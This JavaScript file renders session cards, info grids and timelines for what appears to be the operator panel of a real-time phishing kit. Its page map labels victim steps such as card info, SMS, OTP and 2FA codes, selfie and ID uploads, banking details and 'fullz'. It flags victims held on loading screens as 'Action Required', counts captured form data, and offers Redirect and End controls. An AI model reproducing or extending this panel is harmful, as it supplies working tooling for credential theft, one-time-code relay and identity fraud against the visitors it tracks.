/**
 * ALP - Session Templates & Render Helpers
 * Decoupled card layout, detail grid, timeline, and form visualization templates.
 */
const SessionTemplates = (() => {
  // Global helper for copy to clipboard
  if (typeof window !== 'undefined' && !window.copyToClipboard) {
    window.copyToClipboard = (text, successMsg = 'Copied to clipboard!') => {
      if (!navigator.clipboard) {
        // Fallback for non-secure contexts
        const textArea = document.createElement("textarea");
        textArea.value = text;
        textArea.style.position = "fixed";
        document.body.appendChild(textArea);
        textArea.focus();
        textArea.select();
        try {
          document.execCommand('copy');
          window.showToast(successMsg, 'success');
        } catch (err) {
          console.error('Fallback copy failed', err);
          window.showToast('Failed to copy', 'error');
        }
        document.body.removeChild(textArea);
        return;
      }
      navigator.clipboard.writeText(text).then(() => {
        window.showToast(successMsg, 'success');
      }).catch(err => {
        console.error('Failed to copy: ', err);
        window.showToast('Failed to copy', 'error');
      });
    };
  }

  function parseDate(dateStr) {
    if (!dateStr) return new Date();
    if (typeof dateStr === 'string' && !dateStr.includes('T') && !dateStr.includes('Z') && !dateStr.includes('+')) {
      return new Date(dateStr.trim().replace(' ', 'T') + 'Z');
    }
    return new Date(dateStr);
  }

  function timeAgo(dateStr) {
    const diff = Math.max(0, Date.now() - parseDate(dateStr).getTime());
    const secs = Math.floor(diff / 1000);
    if (secs < 60) return `${secs}s ago`;
    const mins = Math.floor(secs / 60);
    if (mins < 60) return `${mins}m ago`;
    const hrs = Math.floor(mins / 60);
    return `${hrs}h ago`;
  }

  function formatDuration(ms) {
    if (!ms || ms < 1000) return '0s';
    const secs = Math.floor(ms / 1000);
    if (secs < 60) return `${secs}s`;
    const mins = Math.floor(secs / 60);
    const rem = secs % 60;
    if (mins < 60) return `${mins}m ${rem}s`;
    return `${Math.floor(mins / 60)}h ${mins % 60}m`;
  }

  function sessionDuration(startedAt) {
    return formatDuration(Date.now() - parseDate(startedAt).getTime());
  }

  function escapeHtml(s) {
    if (!s) return '';
    const d = document.createElement('div');
    d.textContent = s;
    return d.innerHTML;
  }

  function hexToRgb(hex) {
    if (!hex) return '99,102,241'; // indigo fallback
    const h = hex.replace('#', '');
    const full = h.length === 3
      ? h.split('').map(c => c + c).join('')
      : h;
    const n = parseInt(full, 16);
    return `${(n >> 16) & 255},${(n >> 8) & 255},${n & 255}`;
  }

  function countryFlag(code) {
    if (!code || code.length !== 2) return '🌐';
    return String.fromCodePoint(...[...code.toUpperCase()].map(c => 0x1F1E6 + c.charCodeAt(0) - 65));
  }

  function browserIcon(browser) {
    const b = (browser || '').toLowerCase();
    if (b.includes('chrome')) return '🌐';
    if (b.includes('firefox')) return '🦊';
    if (b.includes('safari')) return '🧭';
    if (b.includes('edge')) return '🔷';
    if (b.includes('opera')) return '🔴';
    return '🌐';
  }

  function deviceIcon(device) {
    const d = (device || '').toLowerCase();
    if (d.includes('mobile') || d.includes('phone')) return '📱';
    if (d.includes('tablet')) return '📱';
    return '💻';
  }

  function osIcon(os) {
    const o = (os || '').toLowerCase();
    if (o.includes('windows')) return '💻';
    if (o.includes('mac') || o.includes('os x')) return '🍏';
    if (o.includes('linux')) return '🐧';
    if (o.includes('android')) return '🤖';
    if (o.includes('ios') || o.includes('iphone') || o.includes('ipad')) return '📱';
    return '💻';
  }

  // Maps a raw page URL/path to a friendly emoji + label
  function pageLabel(url) {
    const p = (url || '').toLowerCase().split('?')[0].replace(/\.html$/, '').replace(/\/$/, '');
    const seg = p.split('/').pop();
    const map = {
      'login':         { icon: '🔐', name: 'Login' },
      'cc':            { icon: '💳', name: 'Card Info' },
      'sms':           { icon: '📱', name: 'SMS Code' },
      'otp':           { icon: '📱', name: 'OTP Code' },
      'email_verify':  { icon: '📧', name: 'Email Verify' },
      'email_code':    { icon: '📧', name: 'Email Code' },
      '2fa':           { icon: '🔑', name: '2FA Code' },
      'authenticator': { icon: '🔑', name: 'Authenticator' },
      'totp':          { icon: '🔑', name: 'TOTP Code' },
      'selfie':        { icon: '🤳', name: 'Selfie Upload' },
      'id_upload':     { icon: '🪪', name: 'ID Upload' },
      'id':            { icon: '🪪', name: 'ID Verify' },
      'document':      { icon: '🪪', name: 'Document' },
      'banking':       { icon: '🏦', name: 'Banking' },
      'bank':          { icon: '🏦', name: 'Bank Details' },
      'personal':      { icon: '👤', name: 'Personal Info' },
      'fullz':         { icon: '📋', name: 'Profile Details' },
      'profile':       { icon: '👤', name: 'Profile' },
      'address':       { icon: '🏠', name: 'Address' },
      'loading':       { icon: '⏳', name: 'Loading Screen' },
      'wait':          { icon: '⏳', name: 'Waiting' },
      'exit':          { icon: '✅', name: 'Exit / Done' },
      'kyc':           { icon: '🪪', name: 'KYC Check' },
      'index':         { icon: '🏠', name: 'Landing Page' },
      'demo':          { icon: '🏠', name: 'Landing Page' },
      'loading':       { icon: '⏳', name: 'Loading Screen' },
      'loader':        { icon: '⏳', name: 'Loading Screen' },
      'wait':          { icon: '⏳', name: 'Waiting Screen' },
      'waiting':       { icon: '⏳', name: 'Waiting Screen' },
      'hold':          { icon: '⏳', name: 'Hold Screen' },
      'processing':    { icon: '⏳', name: 'Processing Screen' },
    };
    return map[seg] || { icon: '📍', name: seg || 'Unknown Page' };
  }

  // Renders a website logo img if logo_url is set, else a coloured initial-letter badge
  function websiteLogoHtml(w, size = 20) {
    const logoUrl = w && w.logo_url;
    const name = w && (w.website_name || w.name) || '?';
    if (logoUrl) {
      return `<img src="${escapeHtml(logoUrl)}" alt="${escapeHtml(name)}" style="width:${size}px;height:${size}px;border-radius:4px;object-fit:contain;background:transparent;" onerror="this.style.display='none'">`;
    }
    const initLetter = name.slice(0,1).toUpperCase();
    const col = avatarColor(name);
    return `<span style="display:inline-flex;align-items:center;justify-content:center;width:${size}px;height:${size}px;border-radius:4px;background:${col};color:#fff;font-size:${Math.round(size*0.55)}px;font-weight:700;flex-shrink:0;">${escapeHtml(initLetter)}</span>`;
  }

  function avatarColor(id) {
    const colors = ['#6366f1','#10b981','#f59e0b','#ef4444','#3b82f6','#8b5cf6','#ec4899','#14b8a6'];
    let h = 0; const s = String(id);
    for (let i = 0; i < s.length; i++) h = s.charCodeAt(i) + ((h << 5) - h);
    return colors[Math.abs(h) % colors.length];
  }

  // ─── Loading page detection ──────────────────────────────────────────────────
  // Returns true for any URL or pageType that represents a loading / hold screen.
  function isLoadingPage(url, pageType) {
    if (pageType === 'loading') return true;
    const p = (url || '').toLowerCase().split('?')[0].replace(/\/$/, '');
    if (!p) return false;

    // Check full path for loading keywords
    if (p.includes('/loading') || p.includes('/wait') || p.includes('/hold') || p.includes('/processing') || p.includes('/verifying') || p.includes('/standby')) {
      return true;
    }

    // Match any path segment that is a loading-type keyword
    const seg = p.split('/').pop();
    if (/^(loading|loader|wait|waiting|hold|holdscreen|please[-_]?wait|standby|processing|verifying|verify|check|checking)(.html)?$/.test(seg)) {
      return true;
    }

    // Check in registered demo pages state if available
    const pagesState = window.DemoPagesState?.pages || window.state?.pages;
    if (Array.isArray(pagesState)) {
      const match = pagesState.find(dp => {
        const dpUrl = (dp.url || '').toLowerCase().split('?')[0].replace(/\/$/, '');
        return dpUrl && (dpUrl === p || p.endsWith(dpUrl) || dpUrl.endsWith(p) || p.endsWith(dpUrl.split('/').pop()));
      });
      if (match && match.form_type === 'loading') return true;
    }

    return false;
  }

  function renderSessionCard(s, selectedSessionIds, isSelectMode) {
    const color = avatarColor(s.visitor_id || s.id);
    const vid = s.visitor_id || s.id || 'Unknown';
    const initials = vid.slice(0, 2).toUpperCase();
    const dur = sessionDuration(s.started_at);
    const lastAct = timeAgo(s.last_activity || s.started_at);
    const isSelected = selectedSessionIds.has(s.id);

    // Website brand color for glow
    const siteRgb = hexToRgb(s.website_color);

    // Parse metadata to check for captured form data
    let formCount = 0;
    try {
      const meta = (typeof s.metadata === 'object') ? s.metadata : JSON.parse(s.metadata || '{}');
      formCount = (meta.formData && meta.formData.length) ? meta.formData.length : 0;
    } catch { /* ignore */ }

    // Check if user is currently on the loading page (hold state)
    const pagePath = (s.current_page || '').toLowerCase();
    const isHolding = s.is_active && isLoadingPage(pagePath, s.current_page_type);
    const isWarning = s.is_active && s.current_page_type === 'warning';

    return `
      <div class="session-card ${s.is_active ? 'is-online' : 'is-offline'} ${isHolding ? 'is-holding' : ''} ${isWarning ? 'is-warning' : ''} ${isSelected ? 'selected' : ''} ${isSelectMode ? 'select-mode-active' : ''}" data-session-id="${s.id}" style="--site-color:${siteRgb};">
        <div class="session-card-select-wrap">
          <div class="card-checkbox"></div>
        </div>
        <div class="card-inner">
          <!-- Header: avatar + visitor ID + badges -->
          <div class="session-card-header">
            <div class="session-card-avatar" style="background:${color}">${escapeHtml(initials)}</div>
            <div class="session-card-visitor">
              <div class="session-card-vid" title="${escapeHtml(vid)}">${escapeHtml(vid)}</div>
              <div class="session-card-badges">
                ${isHolding 
                  ? `<span class="status-badge holding">
                       <span class="pulse-dot-amber"></span>Holding
                     </span>`
                  : isWarning
                  ? `<span class="status-badge warning" style="background:rgba(239,68,68,0.15);color:#ef4444;border:1px solid rgba(239,68,68,0.3);">
                       <span class="pulse-dot-amber" style="background:#ef4444;"></span>Warning
                     </span>`
                  : `<span class="status-badge ${s.is_active ? 'online' : 'offline'}">
                       ${s.is_active ? '<span class="pulse-dot"></span>Live' : 'Offline'}
                     </span>`
                }
                <span class="badge-website" title="${escapeHtml(s.website_domain || '')}" style="display:inline-flex;align-items:center;gap:5px;">
                  ${websiteLogoHtml(s, 14)}
                  ${escapeHtml(s.website_name || 'Website')}
                </span>
                ${isHolding ? `<span class="badge-waiting">⚠️ Action Required</span>` : ''}
                ${isWarning ? `<span class="badge-waiting" style="background:rgba(239,68,68,0.12);color:#ef4444;border-color:rgba(239,68,68,0.25);">🚨 On Warning Page</span>` : ''}
                ${formCount > 0 ? `<span class="badge-formdata">📝 ${formCount} form${formCount > 1 ? 's' : ''}</span>` : ''}
              </div>
            </div>
          </div>

          <!-- IP Address Badge -->
          <div class="ip-badge-box" onclick="event.stopPropagation(); window.copyToClipboard('${escapeHtml(s.ip_address || '')}', 'IP copied!');" title="Click to copy IP">
            <div class="ip-badge-icon">
              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 014 10 15.3 15.3 0 01-4 10 15.3 15.3 0 01-4-10 15.3 15.3 0 014-10z"/></svg>
            </div>
            <span class="ip-badge-addr">${escapeHtml(s.ip_address || '—')}</span>
            <span class="ip-badge-copy">
              <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>
            </span>
          </div>

          <!-- Metadata: location, browser, OS, domain -->
          <div class="session-meta-grid">
            <div class="meta-item">
              <span class="meta-icon">${countryFlag(s.country)}</span>
              <span class="meta-text">${escapeHtml(s.city ? `${s.city}, ${s.country || ''}` : (s.country || 'Unknown'))}</span>
            </div>
            <div class="meta-item">
              <span class="meta-icon">${browserIcon(s.browser)}</span>
              <span class="meta-text">${escapeHtml(s.browser || 'Unknown')}</span>
            </div>
            <div class="meta-item">
              <span class="meta-icon">${osIcon(s.os)}</span>
              <span class="meta-text">${escapeHtml(s.os || 'Unknown')}</span>
            </div>
            ${s.website_domain ? `
            <div class="meta-item" style="cursor:pointer;" onclick="event.stopPropagation();let d='${escapeHtml(s.website_domain)}';window.open(d.startsWith('http')?d:'https://'+d,'_blank','noopener');" title="Open ${escapeHtml(s.website_domain)}">
              <span class="meta-icon">🌐</span>
              <span class="meta-text" style="color:var(--accent-primary);text-decoration:underline;text-underline-offset:2px;">${escapeHtml(s.website_domain)}</span>
            </div>` : ''}
          </div>

          <!-- Active page -->
          <div class="session-path-box ${isHolding ? 'is-holding-path' : ''}">
            ${(() => {
              const lbl = pageLabel(s.current_page);
              return `
                <span class="path-label" style="display:flex;align-items:center;gap:5px;">
                  ${isHolding ? '⏳ Holding On' : '📍 Active Page'}
                </span>
                <span class="path-value" title="${escapeHtml(s.current_page || '/')}"
                  style="display:flex;align-items:center;gap:5px;font-weight:600;">
                  <span style="font-size:13px;">${lbl.icon}</span>
                  <span>${escapeHtml(s.current_page_name || lbl.name)}</span>
                </span>
              `;
            })()}
          </div>

          <!-- Referrer -->
          <div class="session-referrer-box">
            <span class="referrer-label">↩ Referrer:</span>
            <span class="referrer-value">${escapeHtml(s.referrer || 'Direct Traffic')}</span>
          </div>
        </div>

        <!-- Stats strip -->
        <div class="session-card-stats">
          <div class="session-card-stat">
            <span class="session-card-stat-value">${s.pages_viewed || 1}</span>
            <span class="session-card-stat-label">Pages</span>
          </div>
          <div class="session-card-stat">
            <span class="session-card-stat-value">${dur}</span>
            <span class="session-card-stat-label">Duration</span>
          </div>
          <div class="session-card-stat">
            <span class="session-card-stat-value">${lastAct}</span>
            <span class="session-card-stat-label">Last Seen</span>
          </div>
          <div class="session-card-stat">
            <span class="session-card-stat-value">${deviceIcon(s.device)}</span>
            <span class="session-card-stat-label">${escapeHtml((s.device || 'Desktop').slice(0,7))}</span>
          </div>
          ${formCount > 0 ? `<div class="session-card-stat" style="color:#10b981;">
            <span class="session-card-stat-value">📝${formCount}</span>
            <span class="session-card-stat-label">Forms</span>
          </div>` : ''}
        </div>

        <!-- Action buttons flush at bottom -->
        <div class="session-card-actions">
          <button class="btn btn-outline session-view-btn" data-sid="${s.id}">🔍 Details</button>
          <button class="btn btn-primary session-redirect-btn" data-sid="${s.id}" ${s.is_active ? '' : 'disabled'}>↗ Redirect</button>
          ${s.is_active 
            ? `<button class="btn btn-danger session-end-btn" data-sid="${s.id}">⛔ End</button>` 
            : `<button class="btn btn-danger session-delete-btn" data-sid="${s.id}">🗑️ Delete</button>`
          }
        </div>
      </div>
    `;
  }

  function renderInfoGrid(s) {
    const lbl = pageLabel(s.current_page);
    const pageLabelHtml = `<span title="${escapeHtml(s.current_page || '/')}" style="display:inline-flex;align-items:center;gap:5px;">${lbl.icon} <strong>${escapeHtml(lbl.name)}</strong> <span style="opacity:0.5;font-size:10px;font-family:monospace;">${escapeHtml(s.current_page || '/')}</span></span>`;
    const websiteHtml = `<span style="display:inline-flex;align-items:center;gap:6px;">${websiteLogoHtml(s, 16)} ${escapeHtml(s.website_name || 'Unknown')}</span>`;

    const infoRows = [
      ['Visitor ID',    escapeHtml(s.visitor_id || s.id || 'N/A')],
      ['IP Address',    escapeHtml(s.ip_address  || 'N/A')],
      ['Domain',        s.website_domain ? `<a href="${escapeHtml(s.website_domain.startsWith('http') ? s.website_domain : 'https://'+s.website_domain)}" target="_blank" rel="noopener" style="color:var(--accent-primary);">${escapeHtml(s.website_domain)}</a>` : 'N/A'],
      ['Website',       websiteHtml],
      ['Browser',       `${browserIcon(s.browser)} ${escapeHtml(s.browser || 'Unknown')}`],
      ['OS',            `${osIcon(s.os)} ${escapeHtml(s.os || 'Unknown')}`],
      ['Device',        `${deviceIcon(s.device)} ${escapeHtml(s.device || 'Desktop')}`],
      ['Location',      `${countryFlag(s.country)} ${escapeHtml([s.city, s.country].filter(Boolean).join(', ') || 'Unknown')}`],
      ['Referrer',      escapeHtml(s.referrer || 'Direct')],
      ['Pages Viewed',  String(s.pages_viewed || 1)],
      ['Started',       timeAgo(s.started_at)],
      ['Duration',      sessionDuration(s.started_at)],
      ['Current Page',  pageLabelHtml],
      ['Website',       websiteHtml],
      ['Status',        s.is_active ? '<span style="color:#10b981;font-weight:700;">● ONLINE</span>' : '<span style="color:var(--text-muted);">● OFFLINE</span>'],
    ];

    return infoRows.map(([label, value]) => `
      <div class="detail-item">
        <span class="detail-lbl">${label}</span>
        <span class="detail-val">${value}</span>
      </div>
    `).join('');
  }

  function renderTimeline(pageViews) {
    if (!pageViews || pageViews.length === 0) {
      return '<p style="color:var(--text-muted);font-size:13px;margin:0;">No page views recorded yet</p>';
    }
    return pageViews.map(pv => `
      <div class="timeline-item-detail">
        <div class="timeline-dot-detail"></div>
        <div class="timeline-url-detail">${escapeHtml(pv.page_url || pv.page_title || '/')}</div>
        <div class="timeline-time-detail">${timeAgo(pv.timestamp)}${pv.duration_ms ? ' · ' + formatDuration(pv.duration_ms) : ''}</div>
      </div>
    `).join('');
  }

  function renderFormData(metadata) {
    return FormRenderers.renderFormData(metadata);
  }

  return {
    timeAgo,
    formatDuration,
    sessionDuration,
    escapeHtml,
    countryFlag,
    browserIcon,
    deviceIcon,
    osIcon,
    avatarColor,
    pageLabel,
    websiteLogoHtml,
    isLoadingPage,
    renderSessionCard,
    renderInfoGrid,
    renderTimeline,
    renderFormData
  };
})();

if (typeof window !== 'undefined') {
  window.SessionTemplates = SessionTemplates;
}
